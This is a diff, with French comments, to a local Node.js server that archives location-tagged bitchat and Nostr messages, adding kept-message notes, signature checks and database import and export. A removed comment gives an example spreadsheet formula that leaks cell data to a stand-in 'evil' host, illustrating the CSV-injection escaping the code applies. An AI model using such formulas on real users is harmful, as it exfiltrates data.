@@ -4,12 +4,14 @@
 // WebSocket. Pensé pour tourner en local (Docker) — pas exposé publiquement.
 import { WebSocket, WebSocketServer } from "ws";
 import { createServer } from "node:http";
-import { readFileSync } from "node:fs";
+import { readFileSync, createWriteStream, createReadStream, unlinkSync } from "node:fs";
 import { fileURLToPath } from "node:url";
 import { dirname, join } from "node:path";
+import { randomUUID } from "node:crypto";
 import Database from "better-sqlite3";
 import { SocksProxyAgent } from "socks-proxy-agent";
 import ngeohash from "ngeohash";
+import { GEOHASH_RE, isNoise, isValidSignedEvent, levenshtein, matches, parseQuery, matchesOne } from "./filters.mjs";
 
 const __dirname = dirname(fileURLToPath(import.meta.url));
 
@@ -53,6 +55,12 @@ function describeGeohash(geohash) {
     if (d < best) { best = d; nearest = c; }
   }
   const precision = precisionLabel(geohash);
+  // un geohash de 1-3 caractères couvre une cellule de 100 à 5000km de large (ex: "u0"
+  // couvre quasiment toute l'Europe de l'Ouest) -- même le pays du centre de cellule s'est
+  // révélé trompeur ici (ex: "u1" résolu en "Pays-Bas" alors que la cellule couvre aussi
+  // le nord de la France, la Belgique et l'Allemagne) : pas de ville ni de pays à ce
+  // niveau de zoom, juste le label de précision brut.
+  if ((geohash.length || 0) <= 3) return precision;
   return nearest ? `${precision} — près de ${nearest.name} (${Math.round(best)}km)` : precision;
 }
 
@@ -67,19 +75,6 @@ const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS ||
   "http://localhost,http://127.0.0.1"
 ).split(",").map((s) => s.trim());
 const RETENTION_DAYS = Number(process.env.RETENTION_DAYS) || 30;
-
-const MAX_LEN = 3000;
-// plages Unicode des diacritiques combinants utilisées par le spam "zalgo" (écrites en
-// \uXXXX plutôt qu'en caractères bruts -- des combinants littéraux dans le code source
-// s'afficheraient collés au caractère précédent, illisibles à relire/vérifier).
-const COMBINING_RE = /[\u0300-\u036f\u1ab0-\u1aff\u1dc0-\u1dff\u20d0-\u20ff\ufe20-\ufe2f]/g;
-// pseudo g\u00e9n\u00e9r\u00e9 automatiquement par un bot de spam observ\u00e9 en direct : "bot_" suivi
-// d'un suffixe hexad\u00e9cimal al\u00e9atoire (ex: bot_faff61fc) -- change \u00e0 chaque message pour
-// contourner un blocage par pseudo, donnant l'impression trompeuse que "le pseudo change
-// sans arr\u00eat" alors que c'est le m\u00eame spam r\u00e9p\u00e9t\u00e9. Motif tr\u00e8s sp\u00e9cifique : v\u00e9rifi\u00e9 sur la
-// base r\u00e9elle, aucun faux positif parmi les pseudos l\u00e9gitimes contenant "bot" (Nymbot,
-// infobot, AntiSpamBot, nano_bot#..., etc. ont tous un format diff\u00e9rent).
-const BOT_NICK_RE = /^bot_[0-9a-f]{6,8}$/;
 
 // annuaire officiel bitchat (permissionlesstech/georelays, nostr_relays.csv), dédupliqué
 // (host vs host:443 — cf. georelays issue #14) — snapshot figé dans relays.json, voir
@@ -112,6 +107,8 @@ db.exec(`
 const existingCols = db.prepare(`PRAGMA table_info(events)`).all().map((c) => c.name);
 if (!existingCols.includes("location")) db.exec(`ALTER TABLE events ADD COLUMN location TEXT`);
 if (!existingCols.includes("teleported")) db.exec(`ALTER TABLE events ADD COLUMN teleported INTEGER DEFAULT 0`);
+if (!existingCols.includes("kept")) db.exec(`ALTER TABLE events ADD COLUMN kept INTEGER DEFAULT 0`);
+if (!existingCols.includes("kept_note")) db.exec(`ALTER TABLE events ADD COLUMN kept_note TEXT`);
 
 const insertStmt = db.prepare(`
   INSERT OR IGNORE INTO events (id, pubkey, created_at, received_at, geohash, nickname, content, is_noise, relay_origin, location, teleported)
@@ -121,7 +118,7 @@ const insertStmt = db.prepare(`
 // l'auteur du message -- non fiable : fuseau horaire ou horloge locale mal réglée côté
 // client bitchat peuvent faire apparaître un message avant des messages plus anciens).
 const recentStmt = db.prepare(`
-  SELECT id, pubkey, created_at, received_at, geohash, nickname, content, location, teleported FROM events
+  SELECT id, pubkey, created_at, received_at, geohash, nickname, content, location, teleported, kept, kept_note FROM events
   WHERE is_noise = 0 ORDER BY received_at DESC LIMIT ?
 `);
 const countStmt = db.prepare(`SELECT COUNT(*) AS n FROM events`);
@@ -134,10 +131,28 @@ const byGeohashStmt = db.prepare(`
 // export : tout l'historique non-bruit, filtré ensuite en JS par terme+distance (pas en SQL,
 // la distance de Levenshtein n'a pas d'équivalent simple en SQL -- cf. matches() plus bas)
 const exportAllStmt = db.prepare(`
-  SELECT id, pubkey, created_at, received_at, geohash, location, nickname, content, teleported FROM events
+  SELECT id, pubkey, created_at, received_at, geohash, location, nickname, content, teleported, kept, kept_note FROM events
   WHERE is_noise = 0 ORDER BY received_at ASC
 `);
-const cleanupStmt = db.prepare(`DELETE FROM events WHERE received_at < ?`);
+// kept=1 (message "gardé", voir /api/keep) exclu de la purge -- un message mis de côté
+// pour un dossier précis ne doit pas disparaître au bout de RETENTION_DAYS comme le reste.
+const cleanupStmt = db.prepare(`DELETE FROM events WHERE received_at < ? AND kept = 0`);
+const keepStmt = db.prepare(`UPDATE events SET kept = 1, kept_note = ? WHERE id = ?`);
+const unkeepStmt = db.prepare(`UPDATE events SET kept = 0, kept_note = NULL WHERE id = ?`);
+const keptListStmt = db.prepare(`
+  SELECT id, pubkey, created_at, received_at, geohash, location, nickname, content, teleported, kept, kept_note FROM events
+  WHERE kept = 1 ORDER BY received_at DESC
+`);
+
+// nickname/content viennent d'auteurs Nostr non authentifiés -- préfixer d'une apostrophe
+// un champ commençant par =, +, -, @ (ou tab/CR) empêche un tableur (Excel/Sheets/
+// LibreOffice) d'interpréter une formule piégée à l'ouverture (ex: =HYPERLINK(...)) --
+// mitigation standard CSV injection, partagée par tous les exports CSV.
+function escCsv(v) {
+  let s = String(v ?? "");
+  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+  return `"${s.replace(/"/g, '""')}"`;
+}
 
 // --- purge périodique : les events bitchat sont du direct, pas une archive sans fin ---
 function cleanupOldMessages() {
@@ -195,61 +210,8 @@ backfillLocations();
 reclassifyDuplicateSpam();
 setInterval(reclassifyDuplicateSpam, 10 * 60 * 1000); // un flood en cours doit être nettoyé vite, pas au prochain redémarrage
 
-// distance de Levenshtein + matches() : identiques à celles du dashboard (local.html),
-// dupliquées ici pour filtrer l'export par terme de recherche côté serveur.
-function levenshtein(a, b) {
-  const m = a.length, n = b.length;
-  if (m === 0) return n;
-  if (n === 0) return m;
-  let prev = Array.from({ length: n + 1 }, (_, i) => i);
-  for (let i = 1; i <= m; i++) {
-    const cur = [i];
-    for (let j = 1; j <= n; j++) {
-      cur[j] = a[i - 1] === b[j - 1]
-        ? prev[j - 1]
-        : 1 + Math.min(prev[j - 1], prev[j], cur[j - 1]);
-    }
-    prev = cur;
-  }
-  return prev[n];
-}
-// syntaxe de recherche, cohérente avec le dashboard (local.html) : virgule = OU, "+" = ET
-// -- ex: "manif+paris, bastille" matche (manif ET paris) OU bastille.
-function parseQuery(term) {
-  return term.split(",")
-    .map((group) => group.split("+").map((s) => s.trim()).filter(Boolean))
-    .filter((group) => group.length > 0);
-}
-function matchesOne(content, term, dist) {
-  const text = (content || "").toLowerCase();
-  const t = term.toLowerCase();
-  if (dist <= 0) return text.includes(t);
-  const words = text.split(/[^\p{L}\p{N}]+/u).filter(Boolean);
-  return words.some((w) => levenshtein(w, t) <= dist);
-}
-function matches(content, term, dist) {
-  return parseQuery(term).some((group) => group.every((t) => matchesOne(content, t, dist)));
-}
-
 function tagValue(ev, name) {
   return ev.tags.find((t) => t[0] === name)?.[1];
-}
-
-// un message de chat humain n'est quasiment jamais du JSON valide, peu importe sa forme
-// (handshake/nearby-presence avaient un champ "type", mais les chunks d'image base64
-// ("v","ts","n","frame") n'en ont pas -- donc on ne teste plus un champ précis, juste
-// la validité JSON globale).
-// Détecte aussi deux abus observés en direct : des messages énormes (ex: 300 Ko) et le
-// spam "zalgo" (empilement de caractères Unicode combinants pour casser l'affichage).
-function isNoise(content, nickname) {
-  if (nickname && BOT_NICK_RE.test(nickname)) return true;
-  const text = (content || "").trim();
-  if (text.length > MAX_LEN) return true;
-  if (text.startsWith("{") || text.startsWith("[")) {
-    try { JSON.parse(text); return true; } catch { /* pas du JSON, continue */ }
-  }
-  const combining = (text.match(COMBINING_RE) || []).length;
-  return text.length > 0 && combining / text.length > 0.3;
 }
 
 // reclassifie rétroactivement ce que l'ancien filtre (plus étroit) avait laissé passer
@@ -273,6 +235,8 @@ function toClientShape(row) {
     received_at: row.received_at,
     content: row.content,
     location: row.location,
+    kept: !!row.kept,
+    kept_note: row.kept_note ?? null,
     tags,
   };
 }
@@ -292,6 +256,7 @@ const relayAttempts = {};
 const RECONNECT_DELAYS = [500, 1000, 2000, 5000, 15000, 60000, 300000];
 const STABLE_AFTER_MS = 60000;
 const seenIds = new Set();
+let invalidSignatureCount = 0; // visible via /api/status
 
 function scheduleReconnect(url) {
   const attempt = relayAttempts[url] || 0;
@@ -321,9 +286,19 @@ function connectRelay(url) {
     if (seenIds.has(ev.id)) return;
     seenIds.add(ev.id);
 
+    // recalcule l'id NIP-01 et vérifie la signature schnorr (BIP-340) avant toute autre
+    // chose -- un relais malveillant ou en défaut pourrait pousser un événement falsifié ;
+    // rejeter ici donne une vraie valeur probante à ce qui est stocké (cf. filters.mjs).
+    if (!isValidSignedEvent(ev)) { invalidSignatureCount++; return; }
+
+    const geohash = tagValue(ev, "g") || null;
+    // kind 20000 est partagé avec d'autres applis Nostr (pas réservé à bitchat) -- sans
+    // tag g valide, ce n'est pas un message de canal bitchat, on ne le stocke pas du tout
+    // (contrairement au bruit habituel qui lui est stocké et masqué, pas pertinent ici).
+    if (!geohash || !GEOHASH_RE.test(geohash)) return;
+
     const nickname = tagValue(ev, "n") || null;
     const noise = isNoise(ev.content ?? "", nickname);
-    const geohash = tagValue(ev, "g") || null;
     const location = describeGeohash(geohash);
     // tag officiel bitchat ["t","teleport"] : présent quand l'auteur poste dans ce canal
     // geohash sans y être physiquement (cf. NostrProtocol.swift / GeohashMessageHandler.kt)
@@ -385,6 +360,17 @@ const server = createServer((req, res) => {
   }
   if (origin) res.setHeader("Access-Control-Allow-Origin", origin);
 
+  // requête de préflight CORS (déclenchée par tout POST avec un header Content-Type
+  // "non simple" comme application/json, ex: /api/keep, /api/unkeep) -- sans cette
+  // réponse explicite, le navigateur reçoit un 404 du fallback plus bas et bloque la
+  // vraie requête avant même qu'elle parte (erreur "Failed to fetch" côté client).
+  if (req.method === "OPTIONS") {
+    res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
+    res.writeHead(204).end();
+    return;
+  }
+
   if (req.url.startsWith("/api/messages")) {
     const limit = Math.min(10000, Number(new URL(req.url, "http://x").searchParams.get("limit")) || 500);
     const rows = recentStmt.all(limit).map(toClientShape);
@@ -399,7 +385,7 @@ const server = createServer((req, res) => {
   if (req.url === "/api/status") {
     const connected = Object.values(relayOpen).filter(Boolean).length;
     res.setHeader("Content-Type", "application/json");
-    res.end(JSON.stringify({ relaysConnected: connected, relaysTotal: RELAYS.length }));
+    res.end(JSON.stringify({ relaysConnected: connected, relaysTotal: RELAYS.length, invalidSignatureCount }));
     return;
   }
   if (req.url === "/api/stats") {
@@ -428,17 +414,17 @@ const server = createServer((req, res) => {
       // l'auteur, non fiable selon son fuseau/horloge -- cf. recentStmt plus haut).
       const half = Math.ceil(limit / 2);
       const before = db.prepare(`
-        SELECT id, pubkey, created_at, received_at, geohash, nickname, content, location, teleported FROM events
+        SELECT id, pubkey, created_at, received_at, geohash, nickname, content, location, teleported, kept, kept_note FROM events
         WHERE is_noise = 0 AND geohash = ? AND received_at <= ? ORDER BY received_at DESC LIMIT ?
       `).all(geohash, around, half);
       const after = db.prepare(`
-        SELECT id, pubkey, created_at, received_at, geohash, nickname, content, location, teleported FROM events
+        SELECT id, pubkey, created_at, received_at, geohash, nickname, content, location, teleported, kept, kept_note FROM events
         WHERE is_noise = 0 AND geohash = ? AND received_at > ? ORDER BY received_at ASC LIMIT ?
       `).all(geohash, around, half);
       rows = [...after.reverse(), ...before]; // tri global décroissant, comme le cas sans `around`
     } else {
       rows = db.prepare(`
-        SELECT id, pubkey, created_at, received_at, geohash, nickname, content, location, teleported FROM events
+        SELECT id, pubkey, created_at, received_at, geohash, nickname, content, location, teleported, kept, kept_note FROM events
         WHERE is_noise = 0 AND geohash = ? ORDER BY received_at DESC LIMIT ?
       `).all(geohash, limit);
     }
@@ -451,14 +437,29 @@ const server = createServer((req, res) => {
     // le pseudo affiché, que plusieurs comptes différents peuvent partager).
     const params = new URL(req.url, "http://x").searchParams;
     const pubkey = params.get("pubkey");
+    const nickname = params.get("nickname");
     if (!pubkey) { res.writeHead(400).end("paramètre pubkey requis"); return; }
     const limit = Math.min(2000, Number(params.get("limit")) || 500);
     const rows = db.prepare(`
-      SELECT id, pubkey, created_at, received_at, geohash, nickname, content, location, teleported FROM events
+      SELECT id, pubkey, created_at, received_at, geohash, nickname, content, location, teleported, kept, kept_note FROM events
       WHERE is_noise = 0 AND pubkey = ? ORDER BY received_at DESC LIMIT ?
     `).all(pubkey, limit);
+    // messages d'autres comptes (pubkey différente) ayant affiché le même pseudo --
+    // bitchat n'a pas d'identité vérifiée, un pseudo n'appartient à personne : utile à
+    // voir mais jamais à confondre avec le même auteur, donc renvoyé à part.
+    let otherAccountRows = [];
+    if (nickname) {
+      otherAccountRows = db.prepare(`
+        SELECT id, pubkey, created_at, received_at, geohash, nickname, content, location, teleported, kept, kept_note FROM events
+        WHERE is_noise = 0 AND nickname = ? AND pubkey != ? ORDER BY received_at DESC LIMIT ?
+      `).all(nickname, pubkey, limit);
+    }
     res.setHeader("Content-Type", "application/json");
-    res.end(JSON.stringify({ pubkey, messages: rows.map(toClientShape) }));
+    res.end(JSON.stringify({
+      pubkey,
+      messages: rows.map(toClientShape),
+      samePseudoOtherAccounts: otherAccountRows.map(toClientShape),
+    }));
     return;
   }
   if (req.url.startsWith("/api/search")) {
@@ -475,6 +476,28 @@ const server = createServer((req, res) => {
     const recent = rows.slice(-limit).map(toClientShape); // exportAllStmt est trié du plus ancien au plus récent
     res.setHeader("Content-Type", "application/json");
     res.end(JSON.stringify(recent));
+    return;
+  }
+  if (req.url.startsWith("/api/export/kept")) {
+    // export dédié des messages "gardés" (voir /api/keep) avec leur note -- indépendant
+    // d'une recherche, pour extraire le dossier constitué au fil de la veille. Doit être
+    // vérifié AVANT le "/api/export" générique ci-dessous (startsWith l'avalerait sinon).
+    const format = new URL(req.url, "http://x").searchParams.get("format") === "csv" ? "csv" : "json";
+    const rows = keptListStmt.all();
+    const date = new Date().toISOString().slice(0, 10);
+    res.setHeader("Content-Disposition", `attachment; filename="bitchat-gardes-${date}.${format}"`);
+    if (format === "csv") {
+      res.setHeader("Content-Type", "text/csv");
+      const header = "id,pubkey,created_at,received_at,geohash,location,teleported,nickname,content,note\n";
+      const body = rows.map((r) =>
+        [r.id, r.pubkey, r.created_at, r.received_at, r.geohash, r.location, r.teleported ? "oui" : "non", r.nickname, r.content, r.kept_note]
+          .map(escCsv).join(",")
+      ).join("\n");
+      res.end(header + body);
+    } else {
+      res.setHeader("Content-Type", "application/json");
+      res.end(JSON.stringify(rows.map(toClientShape), null, 2));
+    }
     return;
   }
   if (req.url.startsWith("/api/export")) {
@@ -494,24 +517,117 @@ const server = createServer((req, res) => {
     res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
     if (format === "csv") {
       res.setHeader("Content-Type", "text/csv");
-      // nickname/content viennent d'auteurs Nostr non authentifiés -- préfixer d'une
-      // apostrophe un champ commençant par =, +, -, @ (ou tab/CR) empêche un tableur
-      // (Excel/Sheets/LibreOffice) d'interpréter une formule piégée à l'ouverture
-      // (ex: =HYPERLINK("http://evil/leak?d="&A1)) -- mitigation standard CSV injection.
-      const esc = (v) => {
-        let s = String(v ?? "");
-        if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
-        return `"${s.replace(/"/g, '""')}"`;
-      };
       const header = "id,pubkey,created_at,received_at,geohash,location,teleported,nickname,content\n";
       const body = rows.map((r) =>
-        [r.id, r.pubkey, r.created_at, r.received_at, r.geohash, r.location, r.teleported ? "oui" : "non", r.nickname, r.content].map(esc).join(",")
+        [r.id, r.pubkey, r.created_at, r.received_at, r.geohash, r.location, r.teleported ? "oui" : "non", r.nickname, r.content].map(escCsv).join(",")
       ).join("\n");
       res.end(header + body);
     } else {
       res.setHeader("Content-Type", "application/json");
       res.end(JSON.stringify(rows, null, 2));
     }
+    return;
+  }
+  if (req.url === "/api/kept") {
+    res.setHeader("Content-Type", "application/json");
+    res.end(JSON.stringify(keptListStmt.all().map(toClientShape)));
+    return;
+  }
+  if (req.url === "/api/keep" && req.method === "POST") {
+    let body = "";
+    req.on("data", (chunk) => { body += chunk; });
+    req.on("end", () => {
+      let data;
+      try { data = JSON.parse(body); } catch { res.writeHead(400).end("JSON invalide"); return; }
+      if (!data.id) { res.writeHead(400).end("id requis"); return; }
+      const note = typeof data.note === "string" ? data.note.slice(0, 2000) : null;
+      keepStmt.run(note, data.id);
+      res.setHeader("Content-Type", "application/json");
+      res.end(JSON.stringify({ ok: true }));
+    });
+    return;
+  }
+  if (req.url === "/api/unkeep" && req.method === "POST") {
+    let body = "";
+    req.on("data", (chunk) => { body += chunk; });
+    req.on("end", () => {
+      let data;
+      try { data = JSON.parse(body); } catch { res.writeHead(400).end("JSON invalide"); return; }
+      if (!data.id) { res.writeHead(400).end("id requis"); return; }
+      unkeepStmt.run(data.id);
+      res.setHeader("Content-Type", "application/json");
+      res.end(JSON.stringify({ ok: true }));
+    });
+    return;
+  }
+  if (req.url.startsWith("/api/db/export")) {
+    // VACUUM INTO fusionne le WAL et produit un fichier .db autonome et cohérent, sans
+    // arrêter le serveur ni risquer de copier une base à moitié écrite en plein milieu
+    // d'une insertion -- la config (colonnes/liste noire, dans localStorage du navigateur)
+    // n'est volontairement pas incluse : seule la base de messages se partage.
+    const tmpPath = join(dirname(DB_PATH), `export-${randomUUID()}.db`);
+    try {
+      db.exec(`VACUUM INTO '${tmpPath.replace(/'/g, "''")}'`);
+    } catch (e) {
+      res.writeHead(500).end("export impossible : " + e.message);
+      return;
+    }
+    res.setHeader("Content-Type", "application/octet-stream");
+    const date = new Date().toISOString().slice(0, 10);
+    res.setHeader("Content-Disposition", `attachment; filename="bitchat-export-${date}.db"`);
+    const stream = createReadStream(tmpPath);
+    stream.pipe(res);
+    const cleanup = () => { try { unlinkSync(tmpPath); } catch {} };
+    stream.on("close", cleanup);
+    stream.on("error", cleanup);
+    return;
+  }
+  if (req.url.startsWith("/api/db/import")) {
+    // fusion non-destructive : INSERT OR IGNORE sur l'id (clé primaire) ne touche jamais
+    // aux messages déjà présents, n'ajoute que ceux absents de la base actuelle -- importer
+    // la base de quelqu'un d'autre ne peut jamais effacer ou écraser les tiens.
+    const tmpPath = join(dirname(DB_PATH), `import-${randomUUID()}.db`);
+    const writeStream = createWriteStream(tmpPath);
+    const MAX_IMPORT_BYTES = 5 * 1024 * 1024 * 1024; // 5 Go, généreux mais pas illimité
+    let bytesReceived = 0;
+    let aborted = false;
+    const cleanup = () => { try { unlinkSync(tmpPath); } catch {} };
+    req.on("data", (chunk) => {
+      bytesReceived += chunk.length;
+      if (bytesReceived > MAX_IMPORT_BYTES && !aborted) {
+        aborted = true;
+        req.destroy();
+        writeStream.destroy();
+        cleanup();
+        res.writeHead(413).end("fichier trop volumineux");
+      }
+    });
+    req.on("error", cleanup);
+    writeStream.on("finish", () => {
+      if (aborted) return;
+      try {
+        db.exec(`ATTACH DATABASE '${tmpPath.replace(/'/g, "''")}' AS imported`);
+        let added = 0;
+        try {
+          const info = db.prepare(`
+            INSERT OR IGNORE INTO events
+              (id, pubkey, created_at, received_at, geohash, nickname, content, is_noise, relay_origin, location, teleported)
+            SELECT id, pubkey, created_at, received_at, geohash, nickname, content, is_noise, relay_origin, location, teleported
+            FROM imported.events
+          `).run();
+          added = info.changes;
+        } finally {
+          db.exec(`DETACH DATABASE imported`);
+        }
+        res.setHeader("Content-Type", "application/json");
+        res.end(JSON.stringify({ added }));
+      } catch (e) {
+        res.writeHead(400).end("import impossible (fichier invalide ou schéma incompatible) : " + e.message);
+      } finally {
+        cleanup();
+      }
+    });
+    req.pipe(writeStream);
     return;
   }
   res.writeHead(404).end();
